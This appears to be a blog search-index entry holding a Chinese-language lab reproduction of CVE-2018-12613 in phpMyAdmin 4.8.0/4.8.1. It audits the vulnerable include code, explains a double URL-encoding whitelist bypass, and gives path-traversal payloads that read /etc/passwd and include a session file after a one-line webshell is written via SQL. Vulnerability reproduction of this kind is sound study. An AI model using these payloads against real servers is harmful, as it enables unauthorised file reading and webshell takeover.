<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>(CVE-2018-12613)远程文件包含漏洞复现</title>
      <link href="/2024/02/21/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/(CVE-2018-12613)%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/02/21/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/(CVE-2018-12613)%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>适用环境phpmyadmin 4.8.1或4.8.0</p><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>index.php文件中：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>] </span><br><span class="line"><span class="comment">//request接受的target不能为空  </span></span><br><span class="line">&amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>]) </span><br><span class="line"><span class="comment">//target里面的值必须是字符串  </span></span><br><span class="line">&amp;&amp; ! <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^index/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>]) </span><br><span class="line"><span class="comment">//target里面的值不能以index为头  </span></span><br><span class="line">&amp;&amp; ! <span class="title function_ invoke__">in_array</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>], <span class="variable">$target_blacklist</span>)</span><br><span class="line"> <span class="comment">//target传进来的值不能是$target_backlist里面的值 如&quot;import.php&quot;和&quot;export.php&quot;  </span></span><br><span class="line">&amp;&amp; <span class="title class_">Core</span>::<span class="title function_ invoke__">checkPageValidity</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>]) </span><br><span class="line"> <span class="comment">//将值给checkPageValidity()函数 要返回true 才能全整体为真</span></span><br><span class="line">)&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checkPageValidity 函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>) </span>&#123;</span><br><span class="line">　　　　<span class="comment">//首先判断$whitelist不为空 则将$goto_whitelist值赋值给$whitelist</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;  <span class="comment">//这里得追溯下 看看$got_whitelist</span></span><br><span class="line">        &#125;</span><br><span class="line">　　　　<span class="comment">//判断传进来的值 要存在而且</span></span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">　　　　　<span class="comment">//判断传进来的值是否在白名单内</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">　　　　<span class="comment">//截取传进来的？号</span></span><br><span class="line">        <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">            <span class="variable">$page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">　　　　　　<span class="comment">//判断$_page是否输入$page</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">　　　　　　</span><br><span class="line">　　　　　　<span class="comment">//给page解码</span></span><br><span class="line">        <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">　　　　<span class="comment">//截取？号部分</span></span><br><span class="line">        <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">            <span class="variable">$_page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>白名单：<br><img src="/images/CVEphpadmin4.8.1%E5%9B%BE%E7%89%873.png" alt="图片" title="1"><br>可得payload：<br><code>目标ip/index.php?target=db_datadict.php?/../../../../../../../../etc/passwd</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?的二次url编码为%253f</span><br><span class="line">第一次是因为apache在接收到url的get参数的时候，会将&amp; =之外的所有字符，进行一次url解码，这是一次  </span><br><span class="line">第二次是他里面的一次urldecode。然后就解码成为了？。他再取？之前的那块，恰好是白名单中的文件，也就return true了，所以我们就任意文件包含成功了。</span><br></pre></td></tr></table></figure><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>用docker搭建好靶场后进入phpadmin的管理页面 <img src="/images/CVEphpadmin4.8.1%E5%9B%BE%E7%89%872.png" alt="图片" title="2"><br> 先包含远程文件看看漏洞是否存在<br> <img src="/images/CVEphpadmin4.8.1%E5%9B%BE%E7%89%874.png" alt="图片" title="3"><br> 发现漏洞可用，用SQL写入一句话木马<br><img src="/images/CVEphpadmin4.8.1%E5%9B%BE%E7%89%875.png" alt="图片" title="4"><br>写入phpinfo<br><img src="/images/CVEphpadmin4.8.1%E5%9B%BE%E7%89%876.png" alt="图片" title="5"><br>通过cookie我们知道代码存放的文件在&#x2F;tmp&#x2F;sess_c6d8fac7f0e9514493be3d4f690d0057<br>payload:<br><code>/?target=db_datadict.php?/../../../../../../tmp/sess_c6d8fac7f0e9514493be3d4f690d0057</code><br><img src="/images/CVEphpadmin4.8.1%E5%9B%BE%E7%89%877.png" alt="图片" title="6"><br><img src="/images/CVEphpadmin4.8.1%E5%9B%BE%E7%89%878.png" alt="图片" title="7"><br>把shell也写进去用蚁剑连接。<br><img src="/images/CVEphpadmin4.8.1%E5%9B%BE%E7%89%871.png" alt="图片" title="8"><br>成功！</p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
          <category> Web渗透 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
